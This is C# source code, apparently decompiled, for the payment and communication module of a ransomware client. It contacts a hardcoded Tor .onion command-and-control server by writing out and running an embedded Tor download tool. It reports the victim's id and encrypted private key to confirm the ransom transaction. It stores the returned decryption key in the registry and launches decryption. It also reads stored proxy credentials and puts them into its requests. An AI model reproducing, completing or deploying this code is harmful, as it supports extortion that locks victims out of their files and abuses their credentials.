using System;
using System.IO;
using Microsoft.Win32;
using wg.Properties;

namespace wg;

internal class Utils
{
	private static string serverRequestMain = "http://4gxdnocmhl2tzx3z.onion/";

	private static string serverRequestPayment = "http://4gxdnocmhl2tzx3z.onion/?guid={0}&transId={1}&key={2}";

	private static string serverRequestMessage = "http://4gxdnocmhl2tzx3z.onion/?guid={0}&msg={1}";

	private static string TOR_GET_FNAME = "tg.exe";

	public static string REGISTRY_KEY = "Software\\WC";

	public static bool inetAvail = false;

	public static bool useProxy = false;

	public static string LastTransaction
	{
		get
		{
			string text = (string)RegGetVal(REGISTRY_KEY, "transaction_id");
			if (text != null)
			{
				return text;
			}
			return "";
		}
		set
		{
			Registry.CurrentUser.OpenSubKey(REGISTRY_KEY, writable: true)!.SetValue("transaction_id", value);
		}
	}

	public static object RegGetVal(string subkey, string key)
	{
		try
		{
			return Registry.CurrentUser.OpenSubKey(subkey, writable: false)!.GetValue(key);
		}
		catch
		{
			return null;
		}
	}

	public static void CheckInternetConnection()
	{
		if (!inetAvail)
		{
			inetAvail = CheckConnection(useProxy: false);
			if (!inetAvail)
			{
				inetAvail = CheckConnection(useProxy: true);
				useProxy = inetAvail;
			}
		}
	}

	public static bool IsPaymentReceived()
	{
		return RegGetVal(REGISTRY_KEY, "private_key") != null;
	}

	public static void Decrypt(bool demo)
	{
		string path = (string)RegGetVal(REGISTRY_KEY, "wc_path");
		string text = (string)RegGetVal(REGISTRY_KEY, "private_key");
		if (demo)
		{
			PS.ExecuteAndWait(path, "-dd demo");
		}
		else if (!string.IsNullOrEmpty(text))
		{
			PS.ExecuteAndWait(path, "-dd " + text);
		}
	}

	public static string MakeRequest(string URL, bool useProxy)
	{
		PS.RedirectOutput = true;
		string text = "";
		if (useProxy)
		{
			string text2 = (string)RegGetVal(REGISTRY_KEY, "Prx");
			string text3 = (string)RegGetVal(REGISTRY_KEY, "Cred");
			if (text2 == null)
			{
				return "";
			}
			if (text3 != null)
			{
				text2 = ((text2.IndexOf("http://") != -1) ? text2.Insert(7, text3 + "@") : text2.Insert(8, text3 + "@"));
			}
			text = " -proxy " + text2;
		}
		string arguments = "-iu " + URL + text;
		File.WriteAllBytes(TOR_GET_FNAME, Resources.tg);
		string result = PS.ExecuteAndWait(TOR_GET_FNAME, arguments);
		File.Delete(TOR_GET_FNAME);
		PS.RedirectOutput = false;
		return result;
	}

	public static bool CheckConnection(bool useProxy)
	{
		return MakeRequest(serverRequestMain, useProxy).ToUpper().Replace("\r\n", "") == "OK";
	}

	public static int CheckPayment(string transactionId, bool useProxy)
	{
		string text = null;
		try
		{
			string arg = (string)RegGetVal(REGISTRY_KEY, "guid");
			string text2 = (string)RegGetVal(REGISTRY_KEY, "private_key_encrypted");
			text = MakeRequest(string.Format(serverRequestPayment, arg, transactionId, text2.Replace("+", "-").Replace("/", "_").Replace("=", "")), useProxy);
			return int.Parse(text);
		}
		catch
		{
			try
			{
				Convert.FromBase64String(text);
				Registry.CurrentUser.OpenSubKey(REGISTRY_KEY, writable: true)!.SetValue("private_key", text);
				return 0;
			}
			catch
			{
				return -10;
			}
		}
	}

	public static void SendMessage(string text, bool useProxy)
	{
		string arg = (string)RegGetVal(REGISTRY_KEY, "guid");
		MakeRequest(string.Format(serverRequestMessage, arg, text), useProxy);
	}
}
